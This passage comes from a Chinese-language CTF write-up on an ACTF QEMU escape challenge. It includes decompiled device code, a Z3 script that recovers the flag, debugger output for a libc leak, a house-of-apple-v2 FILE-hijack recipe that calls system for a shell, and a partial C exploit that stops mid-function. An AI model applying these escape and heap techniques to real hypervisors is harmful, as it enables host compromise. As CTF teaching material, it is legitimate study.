0x56327d1bbb48 ◂— 0xc /* <span class="string">&#x27;\x0c&#x27;</span> */</span><br><span class="line">04:0020│     0x56327d1bbb50 —▸ 0x56327c437360 —▸ 0x56327c36b930 —▸ 0x56327c1d2260 —▸ 0x56327c1d23e0 ◂— ...</span><br><span class="line">05:0028│     0x56327d1bbb58 ◂— 0x0</span><br><span class="line">06:0030│     0x56327d1bbb60 —▸ 0x56327d1b9ef0 ◂— <span class="string">&#x27;/machine/peripheral-anon/device[0]&#x27;</span></span><br><span class="line">07:0038│     0x56327d1bbb68 ◂— 0x1</span><br></pre></td></tr></table></figure>

<p>pmio_read有一个需要0xa31处值为1，因此需要先解决一下。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( addr - <span class="number">16</span> &gt; <span class="number">0xF</span> || !*((_BYTE *)v2 + <span class="number">0xA31</span>) )</span><br></pre></td></tr></table></figure>

<p>在pmio_write处创建的线程处赋值，某些偏移被强制类型转化了，因此需要看汇编，并且这里使用128为寄存器。变量重命名😢</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_409F40</span><span class="params">(<span class="type">const</span> <span class="type">char</span> ****opaque)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> ****actfState; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> actfDW; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> ****_actfState; <span class="comment">// r10</span></span><br><span class="line">  __m128i *actfBuf0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">const</span> __m128i *actfBuf2; <span class="comment">// r11</span></span><br><span class="line">  __int64 *_stackBuf; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> offset; <span class="comment">// r8d</span></span><br><span class="line">  __m128i *__actfBuf0; <span class="comment">// rdi</span></span><br><span class="line">  __int64 *__stackbuf; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">const</span> __m128i *_actfBuf2; <span class="comment">// rsi</span></span><br><span class="line">  __m128i actfBuf1; <span class="comment">// xmm2</span></span><br><span class="line">  <span class="type">char</span> byte1; <span class="comment">// al</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// cl</span></span><br><span class="line">  __m128i ___actfBuf0; <span class="comment">// xmm5</span></span><br><span class="line">  __m128i _____actfBuf1; <span class="comment">// xmm6</span></span><br><span class="line">  __int128 v16; <span class="comment">// rax</span></span><br><span class="line">  __int128 v18; <span class="comment">// rax</span></span><br><span class="line">  __int128 stackBuf[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-98h] BYREF</span></span><br><span class="line">  __int64 endStackBuf[<span class="number">2</span>]; <span class="comment">// [rsp+20h] [rbp-78h] BYREF</span></span><br><span class="line">  __int64 v21; <span class="comment">// [rsp+30h] [rbp-68h]</span></span><br><span class="line">  __int64 v22; <span class="comment">// [rsp+38h] [rbp-60h]</span></span><br><span class="line">  __m128i _actfBuf0; <span class="comment">// [rsp+40h] [rbp-58h] BYREF</span></span><br><span class="line">  __m128i ___actfBuf1; <span class="comment">// [rsp+50h] [rbp-48h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v25; <span class="comment">// [rsp+68h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v25 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  actfState = <span class="built_in">object_dynamic_cast_assert</span>(opaque, <span class="string">&quot;actf&quot;</span>, <span class="string">&quot;../hw/misc/actfdev.c&quot;</span>, <span class="number">0x24</span>u, <span class="string">&quot;ACTF&quot;</span>);</span><br><span class="line">  actfDW = *((_DWORD *)actfState + <span class="number">0x28D</span>);      <span class="comment">// 0xa34: 值为0x1234ac7f</span></span><br><span class="line">  _actfState = actfState;</span><br><span class="line">  <span class="built_in">memset</span>(stackBuf, <span class="number">0</span>, <span class="built_in">sizeof</span>(stackBuf));</span><br><span class="line">  actfBuf0 = (__m128i *)(actfState + <span class="number">0x147</span>);    <span class="comment">// a38</span></span><br><span class="line">  actfBuf2 = (<span class="type">const</span> __m128i *)(actfState + <span class="number">0x14B</span>);<span class="comment">// a58</span></span><br><span class="line">  _stackBuf = (__int64 *)stackBuf;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)_stackBuf = actfDW;</span><br><span class="line">    _stackBuf = (__int64 *)((<span class="type">char</span> *)_stackBuf + <span class="number">4</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( _stackBuf != endStackBuf );           <span class="comment">// 填充 8 * 0x1234ac7f 到栈上</span></span><br><span class="line">  offset = -(<span class="type">int</span>)actfBuf2;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    __actfBuf0 = &amp;_actfBuf0;</span><br><span class="line">    __stackbuf = (__int64 *)stackBuf;</span><br><span class="line">    _actfBuf2 = actfBuf2;</span><br><span class="line">    actfBuf1 = _mm_loadu_si128((<span class="type">const</span> __m128i *)(_actfState + <span class="number">0x149</span>));<span class="comment">// a48</span></span><br><span class="line">    _actfBuf0 = _mm_loadu_si128((<span class="type">const</span> __m128i *)(_actfState + <span class="number">0x147</span>));<span class="comment">// a38</span></span><br><span class="line">    ___actfBuf1 = actfBuf1;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      byte1 = __actfBuf0-&gt;m128i_i8[<span class="number">0</span>] ^ _actfBuf2-&gt;m128i_i8[<span class="number">0</span>];</span><br><span class="line">      __stackbuf = (__int64 *)((<span class="type">char</span> *)__stackbuf + <span class="number">1</span>);</span><br><span class="line">      v13 = *((_BYTE *)__stackbuf - <span class="number">1</span>) ^ (offset + (_BYTE)_actfBuf2);<span class="comment">// stackBuf 单个字节 ^ 0,1,2...</span></span><br><span class="line">      _actfBuf2 = (<span class="type">const</span> __m128i *)((<span class="type">char</span> *)_actfBuf2 + <span class="number">1</span>);</span><br><span class="line">      __actfBuf0 = (__m128i *)((<span class="type">char</span> *)__actfBuf0 + <span class="number">1</span>);</span><br><span class="line">      *((_BYTE *)__stackbuf - <span class="number">1</span>) = v13;         <span class="comment">// stackBuf 异或结果写回stackBuf</span></span><br><span class="line">      __actfBuf0[<span class="number">-1</span>].m128i_i8[<span class="number">15</span>] = v13 ^ byte1;<span class="comment">// 修改 actfBuf 内容</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( __stackbuf != endStackBuf );</span><br><span class="line">    ___actfBuf0 = _mm_load_si128(&amp;_actfBuf0);</span><br><span class="line">    <span class="built_in">LOBYTE</span>(offset) = offset + <span class="number">0x11</span>;</span><br><span class="line">    _____actfBuf1 = _mm_load_si128(&amp;___actfBuf1);</span><br><span class="line">    *actfBuf0 = _mm_loadu_si128(actfBuf2);</span><br><span class="line">    actfBuf0[<span class="number">1</span>] = _mm_loadu_si128(actfBuf2 + <span class="number">1</span>);</span><br><span class="line">    *(__m128i *)(_actfState + <span class="number">331</span>) = ___actfBuf0;<span class="comment">// a58</span></span><br><span class="line">    *(__m128i *)(_actfState + <span class="number">333</span>) = _____actfBuf1;<span class="comment">// a68</span></span><br><span class="line">                                                <span class="comment">// swap 操作，a38 swap a58 0x20</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( (_BYTE)offset != <span class="number">0xAA</span> - (_BYTE)actfBuf2 );<span class="comment">// 10次循环</span></span><br><span class="line">  endStackBuf[<span class="number">0</span>] = <span class="number">0xABA29EC2A98DD89A</span>LL;</span><br><span class="line">  *((_QWORD *)&amp;v16 + <span class="number">1</span>) = (<span class="type">unsigned</span> __int64)_actfState[<span class="number">327</span>] ^ <span class="number">0xABA29EC2A98DD89A</span>LL;<span class="comment">// a38</span></span><br><span class="line">  endStackBuf[<span class="number">1</span>] = <span class="number">0xBBF1B4AB81B4A9D4</span>LL;</span><br><span class="line">  *(_QWORD *)&amp;v16 = actfBuf0-&gt;m128i_i64[<span class="number">1</span>] ^ <span class="number">0xBBF1B4AB81B4A9D4</span>LL;</span><br><span class="line">  v21 = <span class="number">0xFB92A48DB386FFA8</span>LL;</span><br><span class="line">  v22 = <span class="number">0xEFB491B8AFB4ABD3</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( v16 == <span class="number">0</span> &amp;&amp; !(v21 ^ actfBuf0[<span class="number">1</span>].m128i_i64[<span class="number">0</span>] | actfBuf0[<span class="number">1</span>].m128i_i64[<span class="number">1</span>] ^ <span class="number">0xEFB491B8AFB4ABD3</span>LL) )<span class="comment">// 都为0，可以推出上一步的actfBuf0的值</span></span><br><span class="line">  &#123;</span><br><span class="line">    _actfBuf0.m128i_i64[<span class="number">0</span>] = <span class="number">0x80EF69F1CBD00397</span>LL;</span><br><span class="line">    *((_QWORD *)&amp;v18 + <span class="number">1</span>) = (<span class="type">unsigned</span> __int64)_actfState[<span class="number">331</span>] ^ <span class="number">0x80EF69F1CBD00397</span>LL;<span class="comment">// a58</span></span><br><span class="line">    _actfBuf0.m128i_i64[<span class="number">1</span>] = <span class="number">0xB2EB07859CDA52D3</span>LL;</span><br><span class="line">    *(_QWORD *)&amp;v18 = actfBuf2-&gt;m128i_i64[<span class="number">1</span>] ^ <span class="number">0xB2EB07859CDA52D3</span>LL;</span><br><span class="line">    ___actfBuf1.m128i_i64[<span class="number">0</span>] = <span class="number">0xEC9E22F5A5A07FA3</span>LL;</span><br><span class="line">    ___actfBuf1.m128i_i64[<span class="number">1</span>] = <span class="number">0x4B36DF7B5B655A84</span>LL;</span><br><span class="line">    <span class="keyword">if</span> ( v18 == <span class="number">0</span></span><br><span class="line">      &amp;&amp; !(___actfBuf1.m128i_i64[<span class="number">0</span>] ^ actfBuf2[<span class="number">1</span>].m128i_i64[<span class="number">0</span>] | actfBuf2[<span class="number">1</span>].m128i_i64[<span class="number">1</span>] ^ <span class="number">0x4B36DF7B5B655A84</span>LL) )<span class="comment">// 推出actfBuf2的值</span></span><br><span class="line">    &#123;</span><br><span class="line">      *((_BYTE *)_actfState + <span class="number">0xA31</span>) = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *((_BYTE *)_actfState + <span class="number">0xA30</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以提取出最后的数据</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">buf0<span class="number">-20</span> byte</span><br><span class="line"><span class="number">0xABA29EC2A98DD89A</span>LL</span><br><span class="line"><span class="number">0xBBF1B4AB81B4A9D4</span>LL</span><br><span class="line"><span class="number">0xFB92A48DB386FFA8</span>LL</span><br><span class="line"><span class="number">0xEFB491B8AFB4ABD3</span>LL</span><br><span class="line">buf2<span class="number">-20b</span>yte</span><br><span class="line"><span class="number">0x80EF69F1CBD00397</span>LL</span><br><span class="line"><span class="number">0xB2EB07859CDA52D3</span>LL</span><br><span class="line"><span class="number">0xEC9E22F5A5A07FA3</span>LL</span><br><span class="line"><span class="number">0x4B36DF7B5B655A84</span>LL</span><br></pre></td></tr></table></figure>

<p>算法简化</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">buffer0 = [?] * <span class="number">0x20</span></span><br><span class="line">buffer2 = [?] * <span class="number">0x20</span></span><br><span class="line">stackBuf = [<span class="number">0x7f</span>, <span class="number">0xac</span>, <span class="number">0x34</span>, <span class="number">0x12</span>] * <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    b1 = buffer0[j] ^ buffer2[j]</span><br><span class="line">    b2 = stackBuf[j] ^ (i * <span class="number">0x11</span> + j) &amp; <span class="number">0xff</span>)</span><br><span class="line">    stackBuf[j] = b2</span><br><span class="line">    buffer0[j] = b1 ^ b2</span><br><span class="line">    buffer0, buffer2 = buffer2, buffer0</span><br></pre></td></tr></table></figure>

<p>学习使用Z3-Solver解密：Solver add 约束。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">buffer0 = [?] * 0x20</span></span><br><span class="line"><span class="string">buffer2 = [?] * 0x20</span></span><br><span class="line"><span class="string">stackBuf = [0x7f, 0xac, 0x34, 0x12] * 8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in range(10):</span></span><br><span class="line"><span class="string">  for j in range(32):</span></span><br><span class="line"><span class="string">    b1 = buffer0[j] ^ buffer2[j]</span></span><br><span class="line"><span class="string">    b2 = stackBuf[j] ^ (i * 0x11 + j) &amp; 0xff)</span></span><br><span class="line"><span class="string">    stackBuf[j] = b2</span></span><br><span class="line"><span class="string">    buffer0[j] = b1 ^ b2</span></span><br><span class="line"><span class="string">    buffer0, buffer2 = buffer2, buffer0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sol = Solver()</span><br><span class="line"></span><br><span class="line">stackBuf = [<span class="number">0x7f</span>, <span class="number">0xac</span>, <span class="number">0x34</span>, <span class="number">0x12</span>] * <span class="number">8</span></span><br><span class="line">buf = [BitVec(<span class="string">f&#x27;buf<span class="subst">&#123;i&#125;</span>&#x27;</span>, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x40</span>)]</span><br><span class="line">tmp = [BitVec(<span class="string">f&#x27;tmp<span class="subst">&#123;i&#125;</span>&#x27;</span>, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>)]</span><br><span class="line">order = buf.copy()  <span class="comment"># 为了结果有序</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x40</span>):</span><br><span class="line">    sol.add(buf[i] &lt;= <span class="number">0x7f</span>)</span><br><span class="line">    sol.add(buf[i] &gt;= <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">ans = [</span><br><span class="line">    <span class="number">0xABA29EC2A98DD89A</span>,</span><br><span class="line">    <span class="number">0xBBF1B4AB81B4A9D4</span>,</span><br><span class="line">    <span class="number">0xFB92A48DB386FFA8</span>,</span><br><span class="line">    <span class="number">0xEFB491B8AFB4ABD3</span>,</span><br><span class="line">    <span class="number">0x80EF69F1CBD00397</span>,</span><br><span class="line">    <span class="number">0xB2EB07859CDA52D3</span>,</span><br><span class="line">    <span class="number">0xEC9E22F5A5A07FA3</span>,</span><br><span class="line">    <span class="number">0x4B36DF7B5B655A84</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">byteans = <span class="string">b&#x27;&#x27;</span>.join([pack(<span class="string">&quot;&lt;Q&quot;</span>, num) <span class="keyword">for</span> num <span class="keyword">in</span> ans])</span><br><span class="line"><span class="comment"># print(byteans)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>):</span><br><span class="line">        b1 = buf[j] ^ buf[j + <span class="number">0x20</span>]</span><br><span class="line">        b2 = stackBuf[j] ^ ((j + <span class="number">0x11</span> * i) &amp; <span class="number">0xFF</span>)</span><br><span class="line">        stackBuf[j] = b2</span><br><span class="line">        tmp[j] = b2 ^ b1  <span class="comment"># buf前20位</span></span><br><span class="line"></span><br><span class="line">    buf[:<span class="number">0x20</span>] = buf[<span class="number">0x20</span>:]</span><br><span class="line">    buf[<span class="number">0x20</span>:] = tmp[:<span class="number">0x20</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(byteans) == <span class="number">0x40</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x40</span>):</span><br><span class="line">    sol.add(byteans[i] == buf[i])</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">if</span> sol.check() == sat:</span><br><span class="line">    model = sol.model()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> order:</span><br><span class="line">        flag.append(<span class="built_in">int</span>(<span class="string">f&#x27;<span class="subst">&#123;model[i]&#125;</span>&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> flag))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] no sol&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>pmio_write 可以在 <code>0xa78</code> 处 <code>malloc(0x20)</code>，并且向堆内写内容。pmio_read可以读取内容，可以泄露libc</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; tele 0x55e880791b30+0xa78</span><br><span class="line">00:0000│  0x55e8807925a8 —▸ 0x7f712072fde0 ◂— 0x7f71deadbeef</span><br></pre></td></tr></table></figure>

<p>mmio_read&#x2F;write 存在4字节的越界读写（判断条件是 <code>&lt;= 0x40</code>正好是A78内容，结合pmio可以写入内容，差不多是任意地址写，但是高4字节是固定的，拿vmmap查看，可以改变libc的内容，并且存在rwx区域</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0x7f7130000000     0x7f716ffff000 rwxp 3ffff000      0 [anon_7f7130000] </span><br><span class="line">...</span><br><span class="line">0x7f7177f7d000     0x7f7177fa5000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x7f7177fa5000     0x7f717813a000 r-xp   195000  28000 /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x7f717813a000     0x7f7178192000 r--p    58000 1bd000 /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x7f7178192000     0x7f7178193000 ---p     1000 215000 /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x7f7178193000     0x7f7178197000 r--p     4000 215000 /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">0x7f7178197000     0x7f7178199000 rw-p     2000 219000 /usr/lib/x86_64-linux-gnu/libc.so.6</span><br></pre></td></tr></table></figure>

<p>比较简单利用思路：mmio_write 修改<code>IO_list_all</code>。使用 house of apple V2，exit调用就退出qemu。</p>
<p>需要找到一段内存来泄露libc，任意位置的读写，需要找到合适的位置，我们根据其泄露的地址寻找一段区域。如下是找到main_arena区域。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pagename：我们需要找的，比如libc</span></span><br><span class="line"><span class="comment"># offset: 寻找时一次增加的最大数字</span></span><br><span class="line">pwndbg&gt; leakfind <span class="variable">$rsp</span> --page_name=filename --max_offset=0x48 --max_depth=6</span><br><span class="line"></span><br><span class="line"><span class="comment"># [*] exp.c       leak : 0x7fa420824160</span></span><br><span class="line">pwndbg&gt; leakfind 0x7fa420000000 --max_offset=0x10000 --page_name=libc -s 8 -d 3</span><br><span class="line">0x7fa420000000+0x8a0 —▸ 0x7fa470000030+0x870 —▸ 0x7fa4795e6c80 /usr/lib/x86_64-linux-gnu/libc.so.6</span><br></pre></td></tr></table></figure>

<p>知道上面的，在了解一下house of apple v2 原理，差不多可以做出来</p>
<ul>
<li><code>_flags</code>需要获得<code>shell</code>，前面有两个空格</li>
<li><code>vtable</code>设置为<code>_IO_wfile_jumps</code>地址（加减偏移），使其能成功调用<code>(A+0xd8) = _IO_wfile_overflow</code>即可</li>
<li><code>_wide_data</code>设置为可控堆地址<code>A</code>，即满足<code>*(fp + 0xa0) = A</code></li>
<li><code>_wide_data-&gt;_IO_write_base</code>设置为<code>0</code>，即满足<code>*(A + 0x18) = 0</code></li>
<li><code>_wide_data-&gt;_IO_buf_base</code>设置为<code>0</code>，即满足<code>*(A + 0x30) = 0</code></li>
<li><code>_wide_data-&gt;_wide_vtable</code>设置为可控堆地址<code>B</code>，即满足<code>*(A + 0xe0) = B</code></li>
<li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code>设置为地址<code>C</code>用于劫持<code>RIP</code>，即满足<code>*(B + 0x68) = C</code>，比如说C为system函数</li>
</ul>
<p>A，B全为为fake_io_addr，设置一下就行，甚至连偏移都不需要改</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// clang-format off</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="comment">// clang-format on</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_GREEN <span class="string">&quot;\033[32m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_RED <span class="string">&quot;\033[31m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COLOR_DEFAULT <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DMSG(fmt, ...)                                                         \</span></span><br><span class="line"><span class="meta">  dprintf(STDERR_FILENO, <span class="string">&quot;[*] %s\t&quot;</span> fmt <span class="string">&quot;\n&quot;</span>, __FILE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMSG(fmt, ...)                                                         \</span></span><br><span class="line"><span class="meta">  dprintf(STDERR_FILENO, COLOR_GREEN <span class="string">&quot;[+] %s\t&quot;</span> fmt <span class="string">&quot;\n&quot;</span> COLOR_DEFAULT,        \</span></span><br><span class="line"><span class="meta">          __FILE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EMSG(fmt, ...)                                                         \</span></span><br><span class="line"><span class="meta">  dprintf(STDERR_FILENO, COLOR_RED <span class="string">&quot;[-] %s\t&quot;</span> fmt <span class="string">&quot;\n&quot;</span> COLOR_DEFAULT,          \</span></span><br><span class="line"><span class="meta">          __FILE__, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> fatal(fmt, ...)                                                        \</span></span><br><span class="line"><span class="meta">  do &#123;                                                                         \</span></span><br><span class="line"><span class="meta">    EMSG(fmt, ##__VA_ARGS__);                                                  \</span></span><br><span class="line"><span class="meta">    exit(EXIT_FAILURE);                                                        \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *mmio_mem;</span><br><span class="line"><span class="type">uint32_t</span> pmio_base = <span class="number">0xC040</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> buf[] =</span><br><span class="line">    <span class="string">&quot;ACTF&#123;cH3cK_1n_wI7h_B@by_C1ph3r_Te$t_1n_Q3MU_pl4yg3OuNd_1$_EASy!&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title">pmio_readb</span><span class="params">(<span class="type">uint32_t</span> addr)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">inb</span>(pmio_base + addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint32_t</span> <span class="title">pmio_readl</span><span class="params">(<span class="type">uint32_t</span> addr)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">inl</span>(pmio_base + addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">uint64_t</span> <span class="title">pmio_readll</span><span class="params">(<span class="type">uint32_t</span> addr)</span> </span>&#123;</span><br><span class="line">  <span class="type">uint64_t</span> low, high;</span><br><span class="line">  high = <span class="built_in">pmio_readl</span>(addr + <span class="number">4</span>);</span><br><span class="line">  low = <span class="built_in">pmio_readl</span>(addr);</span><br><span class="line">  <span class="keyword">return</span> (high &lt;&lt; <span class="number">32</span>) | (low &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title">pmio_writel</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> value)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">outl</span>(value, pmio_base + addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title">pmio_writeb</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint8_t</span> value)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">outb</span>(value, pmio_base + addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">mmio_read</span><span class="params">(<span class="type">uint32_t</span> addr)</span> </span>&#123; <span class="keyword">return</span> *((<span class="type">uint32_t</span> *)(mmio_mem + addr)); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title">mmio_write</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> value)</span> </span>&#123;</span><br><span class="line">  *(<span class="type">uint32_t</span> *)(mmio_mem + addr) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title">arb_write</span><span class="params">(<span class="type">uint64_t</span> where, <span class="type">uint64_t</span> what)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">mmio_write</span>(<span class="number">0x40</span>, where &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">  <span class="built_in">pmio_writel</span>(<span class="number">0x10</span>, what &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">  <span class="built_in">pmio_writel</span>(<span class="number">0x14</span>, (what &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setup_mmio</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> fd =</span><br><span class="line">      <span class="built_in">open</span>(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">fatal</span>(<span class="string">&quot;Error setup mmio&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  mmio_mem = <span class="built_in">mmap</span>(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (mmio_mem == MAP_FAILED) &#123;</span><br><span class="line">    <span class="built_in">fatal</span>(<span class="string">&quot;Error mmap mmio_fd&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">DMSG</span>(<span class="string">&quot;init mmio&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setup_pmio</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">iopl</span>(<span class="number">3</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">fatal</span>(<span class="string">&quot;Error setup pmio: I/O permission is not enough&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">DMSG</span>(<span class="string">&quot;init pmio&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">uint64_t</span> ret;</span><br><span class="line">  <span class="type">uint64_t</span> high, low;</span><br><span class="line">  <span class="type">uint64_t</span> leak_main_arena;</span><br><span class="line">  <span class="type">uint64_t</span> 